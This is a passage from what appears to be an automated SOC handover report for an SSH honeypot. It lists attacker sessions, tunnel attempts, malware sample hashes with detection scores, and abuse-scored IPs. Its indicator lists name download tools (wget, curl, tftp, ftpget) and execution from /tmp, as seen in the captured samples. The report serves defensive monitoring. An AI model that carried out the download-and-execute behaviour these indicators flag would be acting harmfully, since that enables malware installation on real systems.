| `2026-07-21 20:27:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.224.62[.]206` to AbuseIPDB if not already reported
- [ ] Block `41.224.62[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-814898a1c512

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-21 20:29 |
| **Last Seen** | 2026-07-21 20:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:29:57` | `cowrie.session.connect` |
| `2026-07-21 20:29:57` | `cowrie.client.version` |
| `2026-07-21 20:29:57` | `cowrie.client.kex` |
| `2026-07-21 20:29:58` | `cowrie.login.success` |
| `2026-07-21 20:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a69a4f4f20f

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-21 20:29 |
| **Last Seen** | 2026-07-21 20:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:29:57` | `cowrie.session.connect` |
| `2026-07-21 20:29:57` | `cowrie.client.version` |
| `2026-07-21 20:29:57` | `cowrie.client.kex` |
| `2026-07-21 20:29:58` | `cowrie.login.success` |
| `2026-07-21 20:29:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-788d63726a58

| Field | Detail |
|---|---|
| **Source IP** | `182.75.227[.]178` |
| **First Seen** | 2026-07-21 20:30 |
| **Last Seen** | 2026-07-21 20:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:30:38` | `cowrie.session.connect` |
| `2026-07-21 20:30:39` | `cowrie.client.version` |
| `2026-07-21 20:30:39` | `cowrie.client.kex` |
| `2026-07-21 20:30:41` | `cowrie.login.success` |
| `2026-07-21 20:30:41` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:30:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `182.75.227[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76f65f96ebbc

| Field | Detail |
|---|---|
| **Source IP** | `171.217.70[.]151` |
| **First Seen** | 2026-07-21 20:40 |
| **Last Seen** | 2026-07-21 20:41 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:40:51` | `cowrie.session.connect` |
| `2026-07-21 20:40:52` | `cowrie.client.version` |
| `2026-07-21 20:40:52` | `cowrie.client.kex` |
| `2026-07-21 20:40:54` | `cowrie.login.success` |
| `2026-07-21 20:40:55` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:41:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.217.70[.]151` to AbuseIPDB if not already reported
- [ ] Block `171.217.70[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44a9abaaa357

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]60` |
| **First Seen** | 2026-07-21 20:42 |
| **Last Seen** | 2026-07-21 20:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:42:26` | `cowrie.session.connect` |
| `2026-07-21 20:42:31` | `cowrie.login.success` |
| `2026-07-21 20:42:32` | `cowrie.session.params` |
| `2026-07-21 20:42:32` | `cowrie.log.closed` |
| `2026-07-21 20:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]60` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]60` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f487dfb250

| Field | Detail |
|---|---|
| **Source IP** | `221.182.185[.]190` |
| **First Seen** | 2026-07-21 20:44 |
| **Last Seen** | 2026-07-21 20:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:44:55` | `cowrie.session.connect` |
| `2026-07-21 20:44:55` | `cowrie.client.version` |
| `2026-07-21 20:44:55` | `cowrie.client.kex` |
| `2026-07-21 20:44:58` | `cowrie.login.success` |
| `2026-07-21 20:44:58` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.182.185[.]190` to AbuseIPDB if not already reported
- [ ] Block `221.182.185[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceeb06e91f35

| Field | Detail |
|---|---|
| **Source IP** | `203.75.170[.]63` |
| **First Seen** | 2026-07-21 20:45 |
| **Last Seen** | 2026-07-21 20:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:45:08` | `cowrie.session.connect` |
| `2026-07-21 20:45:09` | `cowrie.client.version` |
| `2026-07-21 20:45:09` | `cowrie.client.kex` |
| `2026-07-21 20:45:11` | `cowrie.login.success` |
| `2026-07-21 20:45:11` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:45:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.75.170[.]63` to AbuseIPDB if not already reported
- [ ] Block `203.75.170[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf1a0e56cfc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-21 20:49 |
| **Last Seen** | 2026-07-21 20:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:49:46` | `cowrie.session.connect` |
| `2026-07-21 20:49:46` | `cowrie.client.version` |
| `2026-07-21 20:49:46` | `cowrie.client.kex` |
| `2026-07-21 20:49:47` | `cowrie.login.success` |
| `2026-07-21 20:49:47` | `cowrie.session.params` |
| `2026-07-21 20:49:47` | `cowrie.command.input` |
| `2026-07-21 20:49:47` | `cowrie.log.closed` |
| `2026-07-21 20:49:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6538b7b390f

| Field | Detail |
|---|---|
| **Source IP** | `124.221.136[.]114` |
| **First Seen** | 2026-07-21 20:51 |
| **Last Seen** | 2026-07-21 20:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:51:38` | `cowrie.session.connect` |
| `2026-07-21 20:51:38` | `cowrie.client.version` |
| `2026-07-21 20:51:39` | `cowrie.client.kex` |
| `2026-07-21 20:51:40` | `cowrie.login.success` |
| `2026-07-21 20:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.221.136[.]114` to AbuseIPDB if not already reported
- [ ] Block `124.221.136[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18a344164c65

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-07-21 20:51 |
| **Last Seen** | 2026-07-21 20:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:51:46` | `cowrie.session.connect` |
| `2026-07-21 20:51:46` | `cowrie.client.version` |
| `2026-07-21 20:51:46` | `cowrie.client.kex` |
| `2026-07-21 20:51:47` | `cowrie.login.success` |
| `2026-07-21 20:51:47` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d57eff330b3

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-21 20:51 |
| **Last Seen** | 2026-07-21 20:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 20:51:53` | `cowrie.session.connect` |
| `2026-07-21 20:51:53` | `cowrie.client.version` |
| `2026-07-21 20:51:53` | `cowrie.client.kex` |
| `2026-07-21 20:51:56` | `cowrie.login.success` |
| `2026-07-21 20:51:57` | `cowrie.direct-tcpip.request` |
| `2026-07-21 20:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `166.62.102[.]109` | **6** | 2026-07-21 18:57 | 2026-07-21 20:53 | 6m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-21 19:17 | 2026-07-21 20:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `216.70.97[.]74` | **4** | 2026-07-21 19:50 | 2026-07-21 20:42 | 2m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]164` | **3** | 2026-07-21 19:53 | 2026-07-21 19:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-07-21 19:17 | 2026-07-21 19:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]228` | **3** | 2026-07-21 19:10 | 2026-07-21 19:44 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]137` | **3** | 2026-07-21 19:50 | 2026-07-21 19:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]187` | **3** | 2026-07-21 19:50 | 2026-07-21 19:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]110` | **3** | 2026-07-21 19:51 | 2026-07-21 19:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.54[.]130` | **2** | 2026-07-21 20:02 | 2026-07-21 20:04 | 4m | 0 | `T1592` | 🟢 LOW |
| `135.237.123[.]254` | **2** | 2026-07-21 19:43 | 2026-07-21 19:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]133` | **2** | 2026-07-21 20:54 | 2026-07-21 20:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `113.190.252[.]33` | 1 | 2026-07-21 20:01 | 2026-07-21 20:01 | 10s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-07-21 20:01 | 2026-07-21 20:01 | 10s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.208.50[.]142` | 1 | 2026-07-21 19:38 | 2026-07-21 19:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]10` | 1 | 2026-07-21 20:31 | 2026-07-21 20:31 | 5s | 0 | `T1592` | 🟢 LOW |
| `219.144.16[.]16` | 1 | 2026-07-21 20:10 | 2026-07-21 20:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-07-21 19:02 | 2026-07-21 19:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.12[.]214` | 1 | 2026-07-21 20:36 | 2026-07-21 20:37 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]207` | 1 | 2026-07-21 18:56 | 2026-07-21 18:56 | 16s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-07-21 19:43 | 2026-07-21 19:43 | 5s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]60` | 1 | 2026-07-21 20:42 | 2026-07-21 20:42 | 6s | 1 | `T1110.001` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `4756c00dfa749f3fdf3a687a464632d692da370fd159c78b3ed70cad32192555` | ELF Binary (Linux executable) (ARM 32-bit) | `4756c00dfa749f3f...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `51228996cf0280efc9b4c45d499e8527029667335b7b26951990feac7f22595a` | ELF Binary (Linux executable) (x86 32-bit) | `51228996cf0280ef...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `5348b12f049d86c5306ad9ea227b8483155183cb2a535c25b5c587c4c2491923` | ELF Binary (Linux executable) (x86-64 64-bit) | `5348b12f049d86c5...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `5850b6e589ea496b093b3c162dab126789ea118276bc3c23ff4cf75c6c19c8d5` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `5850b6e589ea496b...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59b756899825573563cd53ae62bcd1f703a765f85797c352964e5246f04a85c0` | ELF Binary (Linux executable) (MIPS 32-bit) | `59b7568998255735...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59da60e031a1bc0cadb4d5b62a9b3047c40c490738b5ca7ed367f4a8440561a3` | Unknown binary | `59da60e031a1bc0c...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `5b7b9a6449dcf0b779dd72210926d4567453aa40f16b473343a3aa4372798884` | ELF Binary (Linux executable) (AArch64 64-bit) | `5b7b9a6449dcf0b7...` | 38/100 | 🟢 LOW | **22/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `210.245.95[.]11` | VN | FPT Telecom Company | **100** ⚠️ | 50 |
| `146.56.164[.]20` | KR | Oracle Corporation , Global software solutions , California , USA | **100** ⚠️ | 2 |
| `211.43.139[.]142` | KR | Korea Telecom | **100** ⚠️ | 32 |
| `111.70.32[.]53` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 50 |
| `65.20.233[.]110` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `196.219.93[.]108` | EG | TE Data | **100** ⚠️ | 10 |
| `223.107.72[.]234` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `34.41.211[.]48` | US | Google LLC | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `176.208.50[.]142` | RU | PJSC Rostelecom | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 114 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 101 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 41 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 39 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 38 |

---

## 🔕 False Positive Summary (16 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 11 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 166 cases |
| Tool 34  | Credential Extractor        | ✅ 128 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 85 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 16 filtered (9.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 54 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

